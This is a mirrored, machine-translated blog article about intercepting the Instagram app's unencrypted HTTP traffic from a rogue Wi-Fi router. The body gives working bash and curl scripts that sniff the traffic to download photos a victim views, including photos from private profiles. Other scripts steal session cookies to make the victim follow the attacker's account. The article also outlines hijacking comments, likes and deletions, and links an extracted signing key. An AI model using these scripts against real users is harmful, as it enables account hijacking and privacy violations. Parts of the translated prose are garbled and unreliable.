<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How to instagramm in black or watch for cookies</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hey, name, guess the riddle! What startup was sold in 2012 for a billion dollars? In which regular social network did our reserve president get fleas ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How to instagramm in black or watch for cookies</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/storage2/a1c/50b/562/a1c50b562b31089fbe85b91b9fa298cb.gif"><br><br>  Hey, name, guess the riddle!  What startup was sold in 2012 for a billion dollars?  In which regular social network did our reserve president get fleas last year?  What social network has tried to declare the content generated by the user as its property? <br><br>  Yeah, right!  Today we talk about <b>Instagram</b> . 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      With all the media attention to Instagram, I have never met the security analysis of this project, and there is something to analyze.  Instagram communicates via open http (!) And if it sometimes uses cryptography, it is a very strange way. <br><br>  Many details and cool DIY hack under the cut. <br><a name="habracut"></a><br><h4>  Research platform </h4><br>  As a testing ground for all my experiments, my home router Asus rt-n56u with Padavan custom firmware and Entware repository will act.  This choice was made intentionally.  The result of my digging was a few bash scripts (which I will share below), which can completely autonomously perform some of the things described below without attracting much attention to themselves. <br><br>  In addition, the router emulates free wifi internet: this is exactly what can be in your favorite cafe or at your cunning neighbor. <br><br>  Traffic on the router was going to a network folder using tcpdump <br><br> <code>tcpdump ‚Äìi br0 src &lt;ip &gt; and port 80 ‚Äìw /opt/tmp/dump.dmp</code> <br> <br>  And went through the network folder in Wireshark on the PC.  To restore the http dialogue between the client and the server is very convenient using the ‚ÄúFollow TCP Stream‚Äù function. <br><br><img src="https://habrastorage.org/storage2/291/296/656/2912966566ed4ccaac90b4f870774d64.jpg"><br><br>  To generate my own test POST and GET requests to Instagram servers, I used the convenient plugin for FF - HttpRequester. <br><br><img src="https://habrastorage.org/storage2/c17/369/aa6/c17369aa68bb99b38742c07aaa495e4e.jpg"><br><br>  Instagram also has a <a href="http://instagram.com/developer/">free open API</a> for third-party developers, which works via https (!), But has a number of limitations, the main of which is the lack of the ability to publish an instagram.  I strongly advise you to <a href="https://apigee.com/console/instagram">pick up on developer api</a> !  Fun stuff ... <br><br><h4>  Information Exchange Protocol </h4><br>  All communication between the client and the server (except for authentication) occurs in the clear form using POST and GET requests. <br><br><img src="https://habrastorage.org/storage2/aac/4c3/7f0/aac4c37f0eb0ef17f6e9cb5abef9d15c.jpg"><br><br>  Recently, in order to enhance security, a signed__ function has been added to the protocol, which returns the clever HMAC SHA256 hash of the parameter passed to it and places it in the POST request in place with the parameter itself (see screenshot). <br><br>  Unfortunately, I never managed to solve the hash generation algorithm before Java ate my brain.  Tugged out Androids apk function along with a fixed secret key, I <a href="http://pastebin.com/ZaKuJhy6">uploaded to pastebin</a> for the curious.  If someone can solve it, please share it. <br><br>  The main drawback of the signature_ signed signature procedure is the small set of variables in the hashed string.  For example, a <b>signed signed_body comment will approach any instagram on behalf of any user</b> ;  and in order to make a photo or delete it, you will need the same control media_id hash. <br>  Consider now the most frequent options for POST requests to the server: <br><br>  ### action ############# URL ######################## signed_body ### parameter <br>  Fold up / api / v1 / friendships / create (destroy) / {user_id} / user_id <br>  Comment / api / v1 / media / {media_id} / comment / comment_text <br>  Delete comment / api / v1 / media / {media_id} / comment / {comment_id} / delete / comment_id, media_id <br>  Like (unlock) / api / v1 / media / {media_id} / like (unlike) / media_id <br>  Delete / api / v1 / media / {media_id} / delete / media_id <br>  <i>Media_id is configured as photo_id + ‚Äù_‚Äù + user_id.</i> <br><br><h4>  Application Methods </h4><br>  All of the attacks described below are based on the assumption that you have access to the router, or at least network traffic (for example, using <a href="http://www.itsec.pro/2012/07/blog-post_23.html">passive lan tap</a> ). <br>  Let's start with the fact that we will automatically download all published and viewed photos of the user (including from closed profiles). <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash while true do tcpdump -i br0 port 80 -nn -w - | grep -m 1 -A 1 _7.jpg | awk '{one =$2 ; getline ; print "http://" $2 one ; getline}'| xargs wget -P /opt/tmp/photo done</span></span></code> </pre><br><br>  We catch requests for files _7.jpg in all GET traffic (this is how all large-sized instagrams end up) and feed them to wget.  Photos will appear in the photo folder in real time. <br><br><h5>  Autofollow </h5><br>  Now let's <b>log your account on behalf of the user.</b>  For this we need only flying user defenseless cookies :) <br><br><pre> <code class="bash hljs">/opt/home/admin <span class="hljs-comment"><span class="hljs-comment"># COOKIE=`tcpdump -i br0 port 80 -nn -w - |grep -m 1 ds_user_id= | awk '{print $2$3$4$5}'` /opt/tmp/curl_follow.sh</span></span></code> </pre><br><br>  We catch all flying http traffic.  We catch custom cookies and slightly comb them.  Then we give the script curl_follow.sh <br><br><pre> <code class="bash hljs">/opt/home/admin <span class="hljs-comment"><span class="hljs-comment"># cat /opt/tmp/curl_follow.sh #! /bin/bash curl -X POST \ -H "Connection: Keep-Alive" \ --user-agent "Instagram 3.4.0 Android (17/4.2.1; 240dpi; 480x800; samsung/Samsung; GT-I9100; GT-I9100; smdk4210; en_US)" \ -b $COOKIE \ -d signed_body=08501f85a71be55abfa0d36719f72a27debb2ee769fd2f4ffe086c07ae129f6a.%7B%22user_id%22%3A%2237343536%22%7D&amp;ig_sig_key_version=4" \ instagram.com/api/v1/friendships/create/37343536/</span></span></code> </pre><br><br>  The beauty of this scenario is the ability to work autonomously on the router without human intervention.  Set up, run and admire the growing counter of their followers. <br><br><h5>  What else can you do? </h5><br><h6>  Leave comments to any pictures on behalf of the user. </h6><br>  1. Preheniruyuem the necessary comment from your account on your phone to any instagram; <br>  2. We will catch and copy the data field signed_ package POST; <br>  3. Build your package from the user's cookie, our signed_body and the desired media_id. <br><br><h6>  Like certain instagram on behalf of user </h6><br>  1. Pregenerate the signed_body with the desired media_id; <br>  2. We catch the user's cookie; <br>  3. We do everything the same as in the example with following. <br><br>  You can, of course, use these dark tricks: <br><br><h6>  Disclose all friends </h6>  - get id followers, fold them from the left account, thereby recognizing signed_body user_id.  To deflate on behalf of the user, using the intercepted cookie. <br><br><h6>  Delete user instagrams </h6>  - get the list of the user's media_id, polaykat on behalf of a third-party account, thereby obtaining a signed_body media_id, delete using the user's cookie. <br><br>  Instead of conclusions and conclusions, a small video demonstration: <br><br><iframe width="560" height="315" src="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://www.youtube.com/embed/gl_AEzoeS7Q%3Ffeature%3Doembed&amp;xid=17259,15700019,15700186,15700191,15700253&amp;usg=ALkJrhjK4LuudI8oGiZW66XLIjCfKyhsPQ" frameborder="0" allowfullscreen=""></iframe></div><p>Source: <a href="https://habr.com/ru/post/166773/">https://habr.com/ru/post/166773/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../166763/index.html">Solving tournament problems in Haskell</a></li>
<li><a href="../166765/index.html">Video review of smartphones HTC Windows Phone 8X and HTC Windows Phone 8S</a></li>
<li><a href="../166767/index.html">Yahoo sends back parcels to former employees</a></li>
<li><a href="../166769/index.html">SVN revision number in 1C 7.7 code</a></li>
<li><a href="../166771/index.html">Print gateway based on CUPS for terminal server based on MS WS 2008 R2 and its clients based on MS Win 2k / XP with printers connected to them</a></li>
<li><a href="../166775/index.html">Web pages inside Microsoft PowerPoint presentations</a></li>
<li><a href="../166777/index.html">Regular expressions from the inside</a></li>
<li><a href="../166779/index.html">Canonical may refuse Ubuntu's semi-annual release cycle.</a></li>
<li><a href="../166781/index.html">Dump memcached to disk</a></li>
<li><a href="../166783/index.html">Point-Of-Sale: Automation Promotions</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>